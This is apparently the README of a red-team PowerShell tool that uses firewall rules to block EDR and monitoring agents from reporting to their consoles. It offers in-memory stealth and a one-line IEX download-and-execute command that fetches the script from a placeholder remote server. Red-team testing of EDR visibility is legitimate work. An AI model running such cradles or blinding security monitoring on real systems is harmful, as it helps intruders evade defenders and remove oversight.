# PSisolation

## Overview
PS-Isolation is a specialized tool designed to prevent EDR (Endpoint Detection and Response) and monitoring processes from communicating with their consoles. By leveraging Windows Defender Firewall rules and PowerShell automation, this script dynamically identifies and blocks network traffic for specific monitoring agents and processes.

## Key Features
- Automated Detection: Identifies EDR and monitoring tools running on the system based on predefined and customizable keywords.
- Dynamic Firewall Rules: Implements outbound traffic filtering for detected processes, preventing telemetry from reaching monitoring consoles.
- Customizable rule : Choose to block a specific processes.
- Stealth : Operates entirely in PowerShell, which you can import in memory without touching disk, ensuring minimal system footprint.
- Simple Cleanup: Quickly revert all custom rules and restore normal operations with a single command.

## Use Cases
- Isolate specific processes or tools to prevent them from reporting telemetry during engagements.
- Test EDR visibility and response.
- Enumerate potential exclusions on system without triggering alerts

## Important Notes
- Educational Purposes Only: This tool is intended for research, penetration testing engagements, and educational purposes        
- Requires Administrative Privileges to create rules

## Getting Started

- Import the script in memory from a remote HTTP server 

``IEX(New-Object Net.WebClient).downloadString('http://xxx.xxx.xxx/PSisolation.ps1')``

- Block outgoing traffic by running directly

``Block-MonitoringProc``

or a specific process you want with : 

``Block-SpecificProcessTraffic``
